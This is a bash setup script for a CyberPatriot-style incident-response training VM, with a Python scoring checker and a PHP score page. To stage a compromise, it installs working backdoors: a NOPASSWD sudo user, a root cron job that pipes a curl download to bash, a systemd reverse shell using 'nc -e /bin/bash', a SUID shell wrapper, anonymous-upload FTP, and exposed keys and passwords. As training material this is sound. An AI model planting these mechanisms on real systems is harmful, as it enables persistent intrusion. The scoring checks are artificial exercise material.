#!/bin/bash
# CyberPatriot Linux Incident Response Scenario
# This script creates a Linux VM that simulates a post-attack scenario with
# persistence mechanisms, forensic artifacts, and security vulnerabilities

set -e

# Set variables
HOSTNAME="corp-linux-server"
USERNAME="sysadmin"
PASSWORD="Company2023!"
ATTACKER_USER="maintenance"
ROOT_PASSWORD="S3rverR00t!"
SCENARIO_LEVEL="intermediate" # basic, intermediate, advanced

echo "Setting up CyberPatriot Linux training VM with realistic attack scenario..."

# 1. Initial System Setup
# --------------------
# Set hostname
hostnamectl set-hostname $HOSTNAME

# Create legitimate users
useradd -m -s /bin/bash $USERNAME
echo "$USERNAME:$PASSWORD" | chpasswd
usermod -aG sudo $USERNAME

useradd -m -s /bin/bash admin
echo "admin:AdminPass22" | chpasswd
usermod -aG sudo admin

useradd -m -s /bin/bash webmaster
echo "webmaster:WebDev2023" | chpasswd

useradd -m -s /bin/bash backup
echo "backup:BackupSys34" | chpasswd
usermod -aG backup backup

# Set root password
echo "root:$ROOT_PASSWORD" | chpasswd

# 2. Setup Attack Scenario - SSH Brute Force & Initial Access
# ---------------------------------------------------------
# Simulate SSH brute force attack logs
mkdir -p /var/log/attack-simulation

# Create authentication log with brute force attempt evidence
cat > /var/log/attack-simulation/auth.log << EOF
Jan 15 03:14:22 $HOSTNAME sshd[1234]: Failed password for invalid user admin from 192.168.1.100 port 43150 ssh2
Jan 15 03:14:24 $HOSTNAME sshd[1234]: Failed password for invalid user admin from 192.168.1.100 port 43152 ssh2
Jan 15 03:14:26 $HOSTNAME sshd[1234]: Failed password for invalid user root from 192.168.1.100 port 43154 ssh2
Jan 15 03:14:28 $HOSTNAME sshd[1234]: Failed password for invalid user root from 192.168.1.100 port 43156 ssh2
Jan 15 03:14:30 $HOSTNAME sshd[1234]: Failed password for $USERNAME from 192.168.1.100 port 43158 ssh2
Jan 15 03:14:32 $HOSTNAME sshd[1234]: Failed password for $USERNAME from 192.168.1.100 port 43160 ssh2
Jan 15 03:14:34 $HOSTNAME sshd[1234]: Failed password for $USERNAME from 192.168.1.100 port 43162 ssh2
Jan 15 03:14:36 $HOSTNAME sshd[1234]: Accepted password for $USERNAME from 192.168.1.100 port 43164 ssh2
Jan 15 03:14:36 $HOSTNAME sshd[1234]: pam_unix(sshd:session): session opened for user $USERNAME by (uid=0)
EOF

# Append to real auth log if it exists, otherwise create it
if [ -f /var/log/auth.log ]; then
    cat /var/log/attack-simulation/auth.log >> /var/log/auth.log
else
    cp /var/log/attack-simulation/auth.log /var/log/auth.log
fi

# 3. Attack Persistence #1 - Backdoor User Account
# ---------------------------------------------
# Create attacker user account with sudo privileges
useradd -m -s /bin/bash $ATTACKER_USER
echo "$ATTACKER_USER:Maint@1nP@ss" | chpasswd
usermod -aG sudo $ATTACKER_USER

# Hide user from login screen by setting UID high
usermod -u 999 $ATTACKER_USER

# Add to sudoers file with NOPASSWD option
echo "$ATTACKER_USER ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers.d/maintenance
chmod 440 /etc/sudoers.d/maintenance

# 4. Attack Persistence #2 - Scheduled Tasks
# --------------------------------------
# Create malicious cron job that calls back to attacker IP
echo "*/10 * * * * root curl -s http://192.168.1.100:8080/$(hostname).sh | bash" > /etc/cron.d/system-update
echo "# System update service - DO NOT REMOVE" >> /etc/cron.d/system-update

# Create hidden cron job that re-adds attacker user if removed
mkdir -p /opt/.hidden
cat > /opt/.hidden/security.sh << 'EOF'
#!/bin/bash
if ! id maintenance &>/dev/null; then
    useradd -m -s /bin/bash maintenance
    echo "maintenance:Maint@1nP@ss" | chpasswd
    usermod -aG sudo maintenance
    echo "maintenance ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers.d/maintenance
    chmod 440 /etc/sudoers.d/maintenance
fi
EOF

chmod +x /opt/.hidden/security.sh
echo "*/30 * * * * root /opt/.hidden/security.sh" > /etc/cron.d/security-check
echo "# Security integrity check - DO NOT REMOVE" >> /etc/cron.d/security-check

# 5. Attack Persistence #3 - Malicious Service
# ----------------------------------------
# Create a backdoor systemd service
cat > /etc/systemd/system/system-monitor.service << EOF
[Unit]
Description=System Resource Monitoring Service
After=network.target

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'while true; do sleep 300; nc -e /bin/bash 192.168.1.100 4444 || true; done'
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
EOF

# Enable and start the service
systemctl enable system-monitor.service
systemctl start system-monitor.service

# 6. Attack Persistence #4 - SUID Binary
# ----------------------------------
# Create a backdoor SUID binary for privilege escalation
cat > /usr/local/bin/system-diagnostic << 'EOF'
#!/bin/bash
if [ "$1" == "--debug" ]; then
  /bin/bash
else
  echo "System diagnostic check completed. No issues found."
  echo "For detailed information, use --debug option."
fi
EOF

chmod 4755 /usr/local/bin/system-diagnostic
chown root:root /usr/local/bin/system-diagnostic

# 7. Vulnerable Software Installation
# -------------------------------
# Install vulnerable versions of services (if available)
apt-get update
apt-get install -y apache2 vsftpd mariadb-server openssh-server

# Configure Apache with vulnerable settings
cat > /etc/apache2/conf-available/security.conf << EOF
ServerTokens Full
ServerSignature On
TraceEnable On
EOF

a2enconf security
systemctl restart apache2

# Setup a basic website with a vulnerable file
mkdir -p /var/www/html/admin
cat > /var/www/html/admin/config.php << EOF
<?php
// Database Configuration
\$dbhost = 'localhost';
\$dbuser = 'root';
\$dbpass = 'InsecureRootPass!';
\$dbname = 'corporate_db';

// API Keys
\$api_key = 'sk_live_51KjdS8LkjsdflKSJDFlksjdflKJSdlkfjsLKJDFgkl';
\$api_secret = '9f8g7h6j5k4l3m2n1b';

// Connect to Database
\$conn = new mysqli(\$dbhost, \$dbuser, \$dbpass, \$dbname);

// Check connection
if (\$conn->connect_error) {
    die("Connection failed: " . \$conn->connect_error);
}
?>
EOF

# Configure vsFTPd with anonymous access
cat > /etc/vsftpd.conf << EOF
listen=YES
listen_ipv6=NO
anonymous_enable=YES
local_enable=YES
write_enable=YES
anon_upload_enable=YES
anon_mkdir_write_enable=YES
dirmessage_enable=YES
use_localtime=YES
xferlog_enable=YES
connect_from_port_20=YES
secure_chroot_dir=/var/run/vsftpd/empty
pam_service_name=vsftpd
rsa_cert_file=/etc/ssl/certs/ssl-cert-snakeoil.pem
rsa_private_key_file=/etc/ssl/private/ssl-cert-snakeoil.key
ssl_enable=NO
EOF

systemctl restart vsftpd

# 8. Leaked Credentials and Sensitive Information
# -------------------------------------------
# Create SSH private key with weak permissions
mkdir -p /home/$USERNAME/.ssh
cat > /home/$USERNAME/.ssh/id_rsa << EOF
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
EOF

cat > /home/$USERNAME/.ssh/id_rsa.pub << EOF
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC0Q2BGCZF87rqdiAB1gATz4TMEZSYIyBcDvDvySqN7sId6SmPfzlYUY/0EW3AkdriHZRKpYDggFupmcnDtycz+u8gvyEL/pJcfLoxwyE0/wj7valIYsZAkJfb/4bSbgnOFfMntRtlOdZq8hnEgraw+gach/xga9JC9XJTX052YpfldccsWYErkGRT+/JCvhXSWQJk4SDJPfULzTBSM8XUqMSnmVGQtRbaYU0TPTPguESvggKNBlXRTpFKd70EoWq0HhqQcTvWz0oFlzQG4kRYEi5GziePX5n+C1g7y11TNYmyUYKUo2uKMnJ2rYpnVDsLQKsVASvoeGYSr4RrXNbOUTVSGJLJh/M6Tiv1Qx3BJXrn8WEtibQpfHYOLxl0ufWLYbhNJTZhN3QizbNZe8BdkdEODWMJWFJrwdYHoWsPhCL1E/RCUxoOuxdxTKnrvBwPf41hqTqn0hJ1+MWMBmkzsZjnDKHmFe/kVyGx+JFfmMLejP73t4KCaQC4KK34= root@corp_server
EOF

chown -R $USERNAME:$USERNAME /home/$USERNAME/.ssh
chmod 777 /home/$USERNAME/.ssh
chmod 666 /home/$USERNAME/.ssh/id_rsa
chmod 644 /home/$USERNAME/.ssh/id_rsa.pub

# Create database backup with credentials
mkdir -p /var/backups/db
cat > /var/backups/db/db_backup.sql << EOF
-- MySQL dump 10.13  Distrib 5.7.33, for Linux (x86_64)
--
-- Host: localhost    Database: corporate_db
-- ------------------------------------------------------
-- Server version       5.7.33

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `users`
--

DROP TABLE IF EXISTS `users`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `users` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `username` varchar(50) NOT NULL,
  `password` varchar(255) NOT NULL,
  `email` varchar(100) NOT NULL,
  `created_at` datetime DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  UNIQUE KEY `username` (`username`)
) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `users`
--

LOCK TABLES `users` WRITE;
/*!40000 ALTER TABLE `users` DISABLE KEYS */;
INSERT INTO `users` VALUES 
(1,'admin','$2y$10$KlUMw0XrPfjb2.OLGmgwfe6f7gJKRGY6xNxkd.fR89LNPUBKfH6Ba','admin@company.com','2023-01-15 10:00:00'),
(2,'john','$2y$10$r.A/Jk7InJIvhHDcQBfgoOqSvbMczLHrj5OjgQH/c6JU2Cd1kyDFu','john@company.com','2023-01-15 10:05:00'),
(3,'sarah','$2y$10$BnKlBMJJkB7qqcuMHmW7K.kk7cz5CTgxCr4undRvR5iGNVGBpvvty','sarah@company.com','2023-01-15 10:10:00');
/*!40000 ALTER TABLE `users` ENABLE KEYS */;
UNLOCK TABLES;

-- Dump completed

-- MySQL root credentials: root / InsecureRootPass!
-- Admin user credentials: admin / AdminSecret123
-- Web user credentials: webuser / WebPass567
EOF

chmod 644 /var/backups/db/db_backup.sql

# 9. Create README.txt with Scenario
# ------------------------------
cat > /home/$USERNAME/README.txt << EOF
INCIDENT RESPONSE SCENARIO - CORPORATE LINUX SERVER

Your company has detected unusual network activity from this server in the last 24 hours.
The Security Operations Center (SOC) has received alerts of unauthorized access attempts
and possible data exfiltration from this system.

As the incident response team, your tasks are:

1. Investigate the security breach and identify all compromised accounts
2. Remove any backdoors or persistence mechanisms left by the attacker
3. Secure all vulnerable services and configurations according to company policy
4. Implement proper security measures to prevent future breaches
5. Document your findings and remediation steps

Company Security Policy Requirements:
- All user passwords must be strong and complex
- SSH must be configured securely with key-based authentication preferred
- No unnecessary services should be running
- Proper file and directory permissions must be enforced
- All system and service logs must be enabled and properly configured
- Firewall must be enabled with appropriate rules

FORENSIC QUESTIONS:
1. What IP address was used in the apparent brute force attack?
2. How many failed login attempts were made during the brute force attack?
3. What user account was eventually compromised in this attack?
4. Identify all persistence mechanisms the attacker installed.
5. What sensitive information may have been compromised? List all files containing credentials.

Good luck with your investigation!

- IT Security Team
EOF

chown $USERNAME:$USERNAME /home/$USERNAME/README.txt

# 10. Set up scoring script
# ---------------------
cat > /opt/score.py << 'EOF'
#!/usr/bin/env python3
import os
import subprocess
import json
import pwd
import grp
import stat

class ScoreCheck:
    def __init__(self):
        self.total_points = 0
        self.earned_points = 0
        self.results = []
        
    def add_check(self, name, points, check_function, *args):
        result = check_function(*args)
        self.total_points += points
        if result[0]:
            self.earned_points += points
        self.results.append({
            "name": name,
            "points": points,
            "earned": result[0],
            "message": result[1]
        })
    
    def print_results(self):
        print(f"\n=============== SCORING RESULTS ===============")
        print(f"Total Score: {self.earned_points}/{self.total_points} points\n")
        
        for result in self.results:
            status = "✓" if result["earned"] else "✗"
            print(f"{status} {result['name']} ({result['points']} pts): {result['message']}")
        
        print(f"\nTotal Score: {self.earned_points}/{self.total_points} points")
        print(f"===============================================\n")
        
        # Save results to file
        with open('/var/local/score_results.json', 'w') as f:
            json.dump({
                "total_points": self.total_points,
                "earned_points": self.earned_points,
                "results": self.results
            }, f)

def check_user_removed(username):
    try:
        pwd.getpwnam(username)
        return (False, f"Unauthorized user '{username}' still exists on the system")
    except KeyError:
        return (True, f"Unauthorized user '{username}' successfully removed")

def check_file_removed(filepath):
    if os.path.exists(filepath):
        return (False, f"Malicious file '{filepath}' still exists")
    else:
        return (True, f"Malicious file '{filepath}' successfully removed")

def check_service_disabled(service_name):
    result = subprocess.run(['systemctl', 'is-enabled', service_name], 
                          stdout=subprocess.PIPE, 
                          stderr=subprocess.PIPE)
    if result.returncode != 0 or b'disabled' in result.stdout:
        return (True, f"Service '{service_name}' is properly disabled")
    else:
        return (False, f"Service '{service_name}' is still enabled")

def check_sshd_config(param, expected_value):
    try:
        with open('/etc/ssh/sshd_config', 'r') as f:
            for line in f:
                if line.strip() and not line.strip().startswith('#'):
                    if param in line:
                        if expected_value.lower() in line.lower():
                            return (True, f"SSH parameter '{param}' is correctly set to '{expected_value}'")
        return (False, f"SSH parameter '{param}' is not correctly set to '{expected_value}'")
    except:
        return (False, f"Could not check SSH parameter '{param}'")

def check_firewall_enabled():
    result = subprocess.run(['ufw', 'status'], 
                          stdout=subprocess.PIPE, 
                          stderr=subprocess.PIPE)
    if b'active' in result.stdout:
        return (True, "Firewall is properly enabled")
    else:
        return (False, "Firewall is not enabled")

def check_cron_job_removed(pattern):
    for crondir in ['/etc/cron.d/', '/etc/cron.daily/', '/etc/cron.hourly/', '/etc/cron.monthly/', '/etc/cron.weekly/']:
        if os.path.exists(crondir):
            for filename in os.listdir(crondir):
                filepath = os.path.join(crondir, filename)
                if os.path.isfile(filepath):
                    try:
                        with open(filepath, 'r') as f:
                            content = f.read()
                            if pattern in content:
                                return (False, f"Malicious cron job containing '{pattern}' still exists")
                    except:
                        pass
    return (True, f"No malicious cron jobs containing '{pattern}' found")

def check_suid_permission(filepath):
    if os.path.exists(filepath):
        file_stat = os.stat(filepath)
        if file_stat.st_mode & stat.S_ISUID:
            return (False, f"File '{filepath}' still has SUID permission")
        else:
            return (True, f"SUID permission properly removed from '{filepath}'")
    else:
        return (True, f"File '{filepath}' no longer exists")

def check_password_policies():
    try:
        with open('/etc/pam.d/common-password', 'r') as f:
            content = f.read()
            if 'minlen=8' in content and 'remember=5' in content:
                return (True, "Password policies are properly configured")
            else:
                return (False, "Password policies are not properly configured")
    except:
        return (False, "Could not check password policies")

def check_apache_secure_config():
    try:
        with open('/etc/apache2/conf-available/security.conf', 'r') as f:
            content = f.read()
            if 'ServerTokens Prod' in content and 'ServerSignature Off' in content and 'TraceEnable Off' in content:
                return (True, "Apache security configuration is properly set")
            else:
                return (False, "Apache security configuration is not properly set")
    except:
        return (False, "Could not check Apache security configuration")

def main():
    score = ScoreCheck()
    
    # Check for removed backdoor accounts
    score.add_check("Removed attacker user account", 5, check_user_removed, "maintenance")
    
    # Check for removed malicious cron jobs
    score.add_check("Removed system-update cron job", 5, check_cron_job_removed, "curl -s http://192.168.1.100:8080")
    score.add_check("Removed security-check cron job", 5, check_cron_job_removed, "/opt/.hidden/security.sh")
    
    # Check for removed backdoor service
    score.add_check("Disabled backdoor service", 5, check_service_disabled, "system-monitor")
    score.add_check("Removed SUID backdoor", 5, check_suid_permission, "/usr/local/bin/system-diagnostic")
    
    # Check for secured SSH configuration
    score.add_check("Secured SSH: Root Login", 3, check_sshd_config, "PermitRootLogin", "no")
    score.add_check("Secured SSH: Password Auth", 3, check_sshd_config, "PasswordAuthentication", "no")
    score.add_check("Secured SSH: Empty Passwords", 3, check_sshd_config, "PermitEmptyPasswords", "no")
    
    # Check for firewall enabled
    score.add_check("Enabled firewall", 5, check_firewall_enabled)
    
    # Check for secure Apache configuration
    score.add_check("Secured Apache configuration", 5, check_apache_secure_config)
    
    # Check for secured file permissions
    score.add_check("Secured sensitive config file", 5, check_file_removed, "/var/www/html/admin/config.php")
    
    # Check for password policies
    score.add_check("Implemented password policies", 5, check_password_policies)
    
    # Print results
    score.print_results()

if __name__ == "__main__":
    main()
EOF

chmod +x /opt/score.py

# Create a simple scoring checker script
cat > /usr/local/bin/check_score << 'EOF'
#!/bin/bash
sudo python3 /opt/score.py
EOF

chmod +x /usr/local/bin/check_score

# Create web-based scoring interface
if command -v apache2 &> /dev/null; then
    cat > /var/www/html/score.php << 'EOF'
<?php
$score_file = '/var/local/score_results.json';

if (file_exists($score_file)) {
    $data = json_decode(file_get_contents($score_file), true);
    $earned = $data['earned_points'];
    $total = $data['total_points'];
    $results = $data['results'];
} else {
    // Run the scoring script if results don't exist
    exec('sudo python3 /opt/score.py', $output, $return_var);
    
    if (file_exists($score_file)) {
        $data = json_decode(file_get_contents($score_file), true);
        $earned = $data['earned_points'];
        $total = $data['total_points'];
        $results = $data['results'];
    } else {
        $earned = 0;
        $total = 0;
        $results = [];
    }
}

$percentage = ($total > 0) ? round(($earned / $total) * 100) : 0;
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CyberPatriot Scoring Report</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
        }
        h1 {
            color: #2c3e50;
            border-bottom: 2px solid #3498db;
            padding-bottom: 10px;
        }
        .score-summary {
            background-color: #f8f9fa;
            padding: 15px;
            border-radius: 5px;
            margin-bottom: 20px;
            text-align: center;
        }
        .score-display {
            font-size: 24px;
            font-weight: bold;
            color: #2c3e50;
        }
        .progress-bar {
            height: 20px;
            background-color: #ecf0f1;
            border-radius: 10px;
            margin: 10px 0;
            overflow: hidden;
        }
        .progress-fill {
            height: 100%;
            background-color: #3498db;
            border-radius: 10px;
        }
        table {
            width: 100%;
            border-collapse: collapse;
        }
        th, td {
            padding: 12px 15px;
            text-align: left;
            border-bottom: 1px solid #ddd;
        }
        th {
            background-color: #f2f2f2;
        }
        .success {
            color: #27ae60;
        }
        .failure {
            color: #c0392b;
        }
        .refresh-btn {
            display: block;
            margin: 20px auto;
            padding: 10px 15px;
            background-color: #3498db;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
        }
        .refresh-btn:hover {
            background-color: #2980b9;
        }
    </style>
</head>
<body>
    <h1>CyberPatriot Scoring Report</h1>
    
    <div class="score-summary">
        <div class="score-display"><?php echo $earned; ?> / <?php echo $total; ?> points (<?php echo $percentage; ?>%)</div>
        <div class="progress-bar">
            <div class="progress-fill" style="width: <?php echo $percentage; ?>%"></div>
        </div>
    </div>
    
    <table>
        <thead>
            <tr>
                <th>Status</th>
                <th>Vulnerability</th>
                <th>Points</th>
                <th>Message</th>
            </tr>
        </thead>
        <tbody>
            <?php foreach ($results as $result): ?>
            <tr>
                <td class="<?php echo $result['earned'] ? 'success' : 'failure'; ?>">
                    <?php echo $result['earned'] ? '✓' : '✗'; ?>
                </td>
                <td><?php echo htmlspecialchars($result['name']); ?></td>
                <td><?php echo $result['points']; ?></td>
                <td><?php echo htmlspecialchars($result['message']); ?></td>
            </tr>
            <?php endforeach; ?>
        </tbody>
    </table>
    
    <button class="refresh-btn" onclick="location.reload()">Refresh Score</button>
</body>
</html>
EOF

    chown www-data:www-data /var/www/html/score.php
fi

# 11. Install Tools
# -------------
apt-get install -y wget curl nmap netcat-traditional python3 python3-pip net-tools

# 12. Final Setup & Cleanup
# ---------------------
# Create a baseline list of world-writable files for students
find / -type f -perm -o+w -ls 2>/dev/null | grep -v proc | grep -v sys > /home/$USERNAME/world_writable_files_baseline.txt
chown $USERNAME:$USERNAME /home/$USERNAME/world_writable_files_baseline.txt

# Make /tmp directory world-writable
chmod 1777 /tmp

echo "Linux Incident Response VM setup complete!"
echo ""
echo "This VM simulates a post-attack scenario with various persistence mechanisms,"
echo "backdoors, and security vulnerabilities for CyberPatriot competition training."
echo ""
echo "To score your progress: Run 'check_score' or visit http://localhost/score.php"
echo ""
echo "NOTE: This is for educational purposes only. Do not use in production environments."
